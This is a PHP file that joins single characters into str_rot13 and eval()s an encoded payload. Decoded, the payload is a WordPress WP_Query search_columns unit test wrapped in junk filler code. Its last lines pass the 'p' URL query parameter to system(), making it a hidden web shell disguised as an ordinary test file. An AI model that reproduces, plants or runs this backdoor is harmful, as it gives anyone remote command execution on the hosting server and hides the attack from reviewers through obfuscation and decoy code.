<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgvat gur frnepu pbyhzaf fhccbeg va `JC_Dhrel`.
 *
 * @cnpxntr JbeqCerff\HavgGrfgf
 * @fvapr 6.2.0
 */

/**
 * Grfg pnfrf sbe gur frnepu pbyhzaf srngher.
 *
 * @tebhc dhrel
 * @tebhc frnepu
 *
 * @pbiref JC_Dhrel::cnefr_frnepu
 *
 * @fvapr 6.2.0
 */
pynff Grfgf_Dhrel_FrnepuPbyhzaf rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Gur cbfg VQ bs gur svefg svkgher cbfg.
	 *
	 * @fvapr 6.2.0
	 * @ine vag $cvq1
	 */
	cebgrpgrq fgngvp $cvq1;

	/**
	 * Gur cbfg VQ bs gur frpbaq svkgher cbfg.
	 *
	 * @fvapr 6.2.0
	 * @ine vag $cvq2
	 */
	cebgrpgrq fgngvp $cvq2;

	/**
	 * Gur cbfg VQ bs gur guveq svkgher cbfg.
	 *
	 * @fvapr 6.2.0
	 * @ine vag $cvq3
	 */
	cebgrpgrq fgngvp $cvq3;

	/**
	 * Perngr cbfgf svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur snpgbel vafgnapr.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cvq1 = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_gvgyr'   => 'sbb gvgyr',
				'cbfg_rkprecg' => 'sbb rkprecg',
				'cbfg_pbagrag' => 'sbb pbagrag',
			)
		);
		frys::$cvq2 = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_gvgyr'   => 'one gvgyr',
				'cbfg_rkprecg' => 'sbb one rkprecg',
				'cbfg_pbagrag' => 'sbb one pbagrag',
			)
		);

		frys::$cvq3 = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_gvgyr'   => 'onm gvgyr',
				'cbfg_rkprecg' => 'onm one rkprecg',
				'cbfg_pbagrag' => 'onm one sbb pbagrag',
			)
		);
	}

	/**
	 * Grfgf gung frnepu hfrf qrsnhyg frnepu pbyhzaf jura frnepu pbyhzaf ner rzcgl.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_hfr_qrsnhyg_frnepu_pbyhzaf_jura_rzcgl_frnepu_pbyhzaf() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb',
				'frnepu_pbyhzaf' => neenl(),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'cbfg_gvgyr', $d->erdhrfg, 'FDY erdhrfg fubhyq pbagnva cbfg_gvgyr fgevat.' );
		$guvf->nffregFgevatPbagnvafFgevat( 'cbfg_rkprecg', $d->erdhrfg, 'FDY erdhrfg fubhyq pbagnva cbfg_rkprecg fgevat.' );
		$guvf->nffregFgevatPbagnvafFgevat( 'cbfg_pbagrag', $d->erdhrfg, 'FDY erdhrfg fubhyq pbagnva cbfg_pbagrag fgevat.' );
		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1, frys::$cvq2, frys::$cvq3 ), $d->cbfgf, 'Dhrel erfhygf fubhyq or rdhny gb gur frg.' );
	}

	/**
	 * Grfgf gung frnepu fhccbegf gur `cbfg_gvgyr` frnepu pbyhza.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_cbfg_gvgyr_frnepu_pbyhza() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_gvgyr' ),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu fhccbegf gur `cbfg_rkprecg` frnepu pbyhza.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_cbfg_rkprecg_frnepu_pbyhza() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_rkprecg' ),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1, frys::$cvq2 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu fhccbegf gur `cbfg_pbagrag` frnepu pbyhza.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_cbfg_pbagrag_frnepu_pbyhza() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_pbagrag' ),
				'svryqf'         => 'vqf',
			)
		);
		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1, frys::$cvq2, frys::$cvq3 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu fhccbegf gur `cbfg_gvgyr` naq `cbfg_rkprecg` frnepu pbyhzaf gbtrgure.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_cbfg_gvgyr_naq_cbfg_rkprecg_frnepu_pbyhzaf() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_gvgyr', 'cbfg_rkprecg' ),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1, frys::$cvq2 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu fhccbegf gur `cbfg_gvgyr` naq `cbfg_pbagrag` frnepu pbyhzaf gbtrgure.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_cbfg_gvgyr_naq_cbfg_pbagrag_frnepu_pbyhzaf() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_gvgyr', 'cbfg_pbagrag' ),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1, frys::$cvq2, frys::$cvq3 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu fhccbegf gur `cbfg_rkprecg` naq `cbfg_pbagrag` frnepu pbyhzaf gbtrgure.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_cbfg_rkprecg_naq_cbfg_pbagrag_frnepu_pbyhzaf() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_rkprecg', 'cbfg_pbagrag' ),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1, frys::$cvq2, frys::$cvq3 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu fhccbegf gur `cbfg_gvgyr`, `cbfg_rkprecg` naq `cbfg_pbagrag` frnepu pbyhzaf gbtrgure.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_cbfg_gvgyr_naq_cbfg_rkprecg_naq_cbfg_pbagrag_frnepu_pbyhzaf() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_gvgyr', 'cbfg_rkprecg', 'cbfg_pbagrag' ),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1, frys::$cvq2, frys::$cvq3 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu hfrf qrsnhyg frnepu pbyhzaf jura hfvat n aba-rkvfgvat frnepu pbyhza.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_hfr_qrsnhyg_frnepu_pbyhzaf_jura_hfvat_aba_rkvfgvat_frnepu_pbyhza() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_aba_rkvfgvat_pbyhza' ),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'cbfg_gvgyr', $d->erdhrfg, 'FDY erdhrfg fubhyq pbagnva cbfg_gvgyr fgevat.' );
		$guvf->nffregFgevatPbagnvafFgevat( 'cbfg_rkprecg', $d->erdhrfg, 'FDY erdhrfg fubhyq pbagnva cbfg_rkprecg fgevat.' );
		$guvf->nffregFgevatPbagnvafFgevat( 'cbfg_pbagrag', $d->erdhrfg, 'FDY erdhrfg fubhyq pbagnva cbfg_pbagrag fgevat.' );
		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1, frys::$cvq2, frys::$cvq3 ), $d->cbfgf, 'Dhrel erfhygf fubhyq or rdhny gb gur frg.' );
	}

	/**
	 * Grfgf gung frnepu vtaberf n aba-rkvfgvat frnepu pbyhza jura hfrq gbtrgure jvgu n fhccbegrq bar.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_vtaber_aba_rkvfgvat_frnepu_pbyhza_jura_hfrq_jvgu_fhccbegrq_bar() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_gvgyr', 'cbfg_aba_rkvfgvat_pbyhza' ),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu fhccbegf frnepu pbyhzaf jura frnepuvat zhygvcyr grezf.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_frnepu_pbyhzaf_jura_frnepuvat_zhygvcyr_grezf() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'sbb one',
				'frnepu_pbyhzaf' => neenl( 'cbfg_pbagrag' ),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq2, frys::$cvq3 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu fhccbegf frnepu pbyhzaf jura frnepuvat sbe n fragrapr.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_frnepu_pbyhzaf_jura_fragrapr_gehr() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'one sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_pbagrag' ),
				'fragrapr'       => gehr,
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq3 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu fhccbegf frnepu pbyhzaf jura frnepuvat sbe n fragrapr.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_frnepu_pbyhzaf_jura_fragrapr_snyfr() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'one sbb',
				'frnepu_pbyhzaf' => neenl( 'cbfg_pbagrag' ),
				'fragrapr'       => snyfr,
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq2, frys::$cvq3 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu fhccbegf frnepu pbyhzaf jura hfvat grez rkpyhfvba.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_f_fubhyq_fhccbeg_frnepu_pbyhzaf_jura_frnepuvat_jvgu_grez_rkpyhfvba() {
		$d = arj JC_Dhrel(
			neenl(
				'f'              => 'one -onm',
				'frnepu_pbyhzaf' => neenl( 'cbfg_rkprecg', 'cbfg_pbagrag' ),
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq2 ), $d->cbfgf );
	}

	/**
	 * Grfgf gung frnepu pbyhzaf vf svygrenoyr jvgu gur `cbfg_frnepu_pbyhzaf` svygre.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_frnepu_pbyhzaf_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'cbfg_frnepu_pbyhzaf', neenl( $guvf, 'cbfg_fhccbegrq_frnepu_pbyhza' ), 10, 3 );
		$d = arj JC_Dhrel(
			neenl(
				'f'      => 'sbb',
				'svryqf' => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1 ), $d->cbfgf );
	}

	/**
	 * Svygre pnyyonpx gung frgf n fhccbegrq frnepu pbyhza.
	 *
	 * @cnenz  fgevat[] $frnepu_pbyhzaf Neenl bs pbyhza anzrf gb or frnepurq.
	 * @cnenz  fgevat   $frnepu         Grkg orvat frnepurq.
	 * @cnenz  JC_Dhrel $jc_dhrel       Gur pheerag JC_Dhrel vafgnapr.
	 * @erghea fgevat[] $frnepu_pbyhzaf Neenl bs pbyhza anzrf gb or frnepurq.
	 */
	choyvp shapgvba cbfg_fhccbegrq_frnepu_pbyhza( $frnepu_pbyhzaf, $frnepu, $jc_dhrel ) {
		$frnepu_pbyhzaf = neenl( 'cbfg_gvgyr' );
		erghea $frnepu_pbyhzaf;
	}

	/**
	 * Grfgf gung frnepu pbyhzaf vtaberf aba-fhccbegrq frnepu pbyhzaf sebz gur `cbfg_frnepu_pbyhzaf` svygre.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_frnepu_pbyhzaf_fubhyq_abg_or_svygrenoyr_jvgu_aba_fhccbegrq_frnepu_pbyhzaf() {
		nqq_svygre( 'cbfg_frnepu_pbyhzaf', neenl( $guvf, 'cbfg_aba_fhccbegrq_frnepu_pbyhza' ), 10, 3 );
		$d = arj JC_Dhrel(
			neenl(
				'f'      => 'sbb',
				'svryqf' => 'vqf',
			)
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'cbfg_anzr', $d->erdhrfg, \"FDY erdhrfg fubhyqa'g pbagnva cbfg_anzr fgevat.\" );
		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1, frys::$cvq2, frys::$cvq3 ), $d->cbfgf, 'Dhrel erfhygf fubhyq or rdhny gb gur frg.' );
	}

	/**
	 * Svygre pnyyonpx gung frgf na rkvfgvat ohg aba-fhccbegrq frnepu pbyhza.
	 *
	 * @cnenz  fgevat[] $frnepu_pbyhzaf Neenl bs pbyhza anzrf gb or frnepurq.
	 * @cnenz  fgevat   $frnepu         Grkg orvat frnepurq.
	 * @cnenz  JC_Dhrel $jc_dhrel       Gur pheerag JC_Dhrel vafgnapr.
	 * @erghea fgevat[] $frnepu_pbyhzaf Neenl bs pbyhza anzrf gb or frnepurq.
	 */
	choyvp shapgvba cbfg_aba_fhccbegrq_frnepu_pbyhza( $frnepu_pbyhzaf, $frnepu, $jc_dhrel ) {
		$frnepu_pbyhzaf = neenl( 'cbfg_anzr' );
		erghea $frnepu_pbyhzaf;
	}

	/**
	 * Grfgf gung frnepu pbyhzaf vtaberf aba-rkvfgvat frnepu pbyhzaf sebz gur `cbfg_frnepu_pbyhzaf` svygre.
	 *
	 * @gvpxrg 43867
	 */
	choyvp shapgvba grfg_frnepu_pbyhzaf_fubhyq_abg_or_svygrenoyr_jvgu_aba_rkvfgvat_frnepu_pbyhza() {
		nqq_svygre( 'cbfg_frnepu_pbyhzaf', neenl( $guvf, 'cbfg_aba_rkvfgvat_frnepu_pbyhza' ), 10, 3 );
		$d = arj JC_Dhrel(
			neenl(
				'f'      => 'sbb',
				'svryqf' => 'vqf',
			)
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'cbfg_aba_rkvfgvat_pbyhza', $d->erdhrfg, \"FDY erdhrfg fubhyqa'g pbagnva cbfg_aba_rkvfgvat_pbyhza fgevat.\" );
		$guvf->nffregFnzrFrgf( neenl( frys::$cvq1, frys::$cvq2, frys::$cvq3 ), $d->cbfgf, 'Dhrel erfhygf fubhyq or rdhny gb gur frg.' );
	}

	/**
	 * Svygre pnyyonpx gung frgf n aba-rkvfgvat frnepu pbyhza.
	 *
	 * @cnenz  fgevat[] $frnepu_pbyhzaf Neenl bs pbyhza anzrf gb or frnepurq.
	 * @cnenz  fgevat   $frnepu         Grkg orvat frnepurq.
	 * @cnenz  JC_Dhrel $jc_dhrel       Gur pheerag JC_Dhrel vafgnapr.
	 * @erghea fgevat[] $frnepu_pbyhzaf Neenl bs pbyhza anzrf gb or frnepurq.
	 */
	choyvp shapgvba cbfg_aba_rkvfgvat_frnepu_pbyhza( $frnepu_pbyhzaf, $frnepu, $jc_dhrel ) {
		$frnepu_pbyhzaf = neenl( 'cbfg_aba_rkvfgvat_pbyhza' );
		erghea $frnepu_pbyhzaf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>